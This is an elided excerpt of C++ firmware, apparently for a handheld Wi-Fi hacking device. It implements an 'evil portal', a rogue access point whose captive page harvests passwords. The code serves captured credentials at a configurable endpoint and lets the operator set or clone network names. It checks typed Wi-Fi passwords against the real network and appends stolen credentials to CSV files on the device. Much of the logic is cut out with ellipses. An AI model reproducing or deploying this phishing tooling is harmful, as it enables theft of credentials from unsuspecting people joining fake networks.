...
void EvilPortal::CaptiveRequestHandler::handleRequest(AsyncWebServerRequest *request) {
    ...
    else if (url == leleConfig.evilPortalEndpoints.getCredsEndpoint &&
             leleConfig.evilPortalEndpoints.allowGetCreds)
        request->send(200, "text/html", _portal->creds_GET());
    else if (url == leleConfig.evilPortalEndpoints.setSsidEndpoint &&
             leleConfig.evilPortalEndpoints.allowSetSsid) {
...
bool EvilPortal::setup() {
    ...
    if (apName == "") {
        if (leleConfig.evilWifiNames.empty()) {
            ...
            for (const auto &_wifi : leleConfig.evilWifiNames) {
...
void EvilPortal::setupRoutes() {
    ...
    if (leleConfig.evilPortalEndpoints.allowGetCreds) {
        webServer.on(
            leleConfig.evilPortalEndpoints.getCredsEndpoint.c_str(),
            [this](AsyncWebServerRequest *request) { request->send(200, "text/html", creds_GET()); }
        );
    }
    if (leleConfig.evilPortalEndpoints.allowSetSsid) {
        webServer.on(
            leleConfig.evilPortalEndpoints.setSsidEndpoint.c_str(), [this](AsyncWebServerRequest *request) {
                if (request->hasArg("ssid")) {
...
void EvilPortal::drawScreen() {
    ...
    padprintln("");
    if (leleConfig.evilPortalEndpoints.showEndpoints) {
        if (leleConfig.evilPortalEndpoints.allowGetCreds) {
            padprintln("-> " + apIp + leleConfig.evilPortalEndpoints.getCredsEndpoint + " -> get creds");
        } else {
            padprintln("-> cred access disabled");
        }
        if (leleConfig.evilPortalEndpoints.allowSetSsid) {
            padprintln("-> " + apIp + leleConfig.evilPortalEndpoints.setSsidEndpoint + " -> set ssid");
        } else {
    ...
    String passMode = "";
    switch (leleConfig.evilPortalPasswordMode) {
...
void EvilPortal::credsController(AsyncWebServerRequest *request) {
    ...
    if (_verifyPwd && passwordValue != "") {
        ...
        if (isCorrect) {
            ...
            if (leleConfig.getWifiPassword(apName) != "") {
                leleConfig.addWifiCredential(apName, passwordValue);
            }
...
String EvilPortal::ssid_GET() {
    return getHtmlTemplate(
        ...
        leleConfig.evilPortalEndpoints.setSsidEndpoint +
...
void EvilPortal::saveToCSV(const String &csvLine, bool isAPname) {
    ...
    if (!fs->exists("/LeleEvilCreds")) fs->mkdir("/LeleEvilCreds");

    File file;

    if (!isAPname) {
        file = fs->open("/LeleEvilCreds/" + outputFile, FILE_APPEND);
    } else {
        file = fs->open("/LeleEvilCreds/" + apName + "_creds.csv", FILE_APPEND);
    }
